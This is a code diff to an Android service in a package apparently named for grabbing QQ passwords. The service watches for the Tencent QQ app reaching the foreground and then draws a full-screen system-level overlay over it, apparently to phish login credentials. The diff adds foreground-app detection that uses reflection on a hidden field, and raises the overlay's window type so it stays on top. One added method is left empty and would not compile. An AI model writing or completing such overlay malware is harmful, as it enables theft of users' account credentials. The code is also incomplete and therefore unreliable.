@@ -2,10 +2,12 @@ package com.android.grabqqpwd;
 
 import android.app.ActivityManager;
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.graphics.Rect;
+import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
@@ -16,13 +18,13 @@ import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.MotionEvent;
 import android.view.View;
-import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.CheckBox;
 import android.widget.CompoundButton;
 import android.widget.EditText;
 
+import java.lang.reflect.Field;
 import java.util.List;
 
 /**
@@ -59,16 +61,54 @@ public class BackgroundDetectService extends Service implements View.OnClickList
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }
-                    ActivityManager activityManager = (ActivityManager)
-                            getSystemService(Context.ACTIVITY_SERVICE);
-                    List<ActivityManager.RunningAppProcessInfo> list =
-                            activityManager.getRunningAppProcesses();
+                    ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                    List<ActivityManager.RunningAppProcessInfo> list = activityManager.getRunningAppProcesses();
                     if (list.get(0).processName.equals("com.tencent.mobileqq")){
                         myHandler.sendEmptyMessage(1);
                     }
                 }
             }
         }).start();
+    }
+
+    private String getTopActivityBeforeL(){
+        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+        final List<ActivityManager.RunningTaskInfo> taskInfo = activityManager.getRunningTasks(1);
+        final ComponentName componentName = taskInfo.get(0).topActivity;
+        return componentName.getPackageName();
+    }
+
+    //http://stackoverflow.com/questions/24625936/getrunningtasks-doesnt-work-in-android-l
+    //processState只能在21版本之后使用
+    private String getTopActivityBeforeMAfterL() {
+        final int PROCESS_STATE_TOP = 2;
+        Field field = null;
+        ActivityManager.RunningAppProcessInfo currentInfo = null;
+        try {
+            field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");
+        } catch (Exception ignored) {
+        }
+        ActivityManager activityManager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
+        final List<ActivityManager.RunningAppProcessInfo> processInfos = activityManager.getRunningAppProcesses();
+        for (ActivityManager.RunningAppProcessInfo processInfo : processInfos) {
+            if (processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
+                    && processInfo.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN) {
+                Integer state = null;
+                try {
+                    state = field.getInt(processInfo);
+                } catch (Exception e) {
+                }
+                if (state != null && state == PROCESS_STATE_TOP) {
+                    currentInfo = processInfo;
+                    break;
+                }
+            }
+        }
+        return currentInfo!=null ? currentInfo.processName : null;
+    }
+
+    private String getTopActivityAfterM(){
+
     }
 
     private class MyHandler extends Handler{
@@ -85,7 +125,7 @@ public class BackgroundDetectService extends Service implements View.OnClickList
         params.width = WindowManager.LayoutParams.MATCH_PARENT;
         params.height = WindowManager.LayoutParams.MATCH_PARENT;
         params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-        params.type = WindowManager.LayoutParams.TYPE_TOAST;
+        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
         params.format = PixelFormat.TRANSPARENT;
         params.gravity = Gravity.CENTER;
         params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;
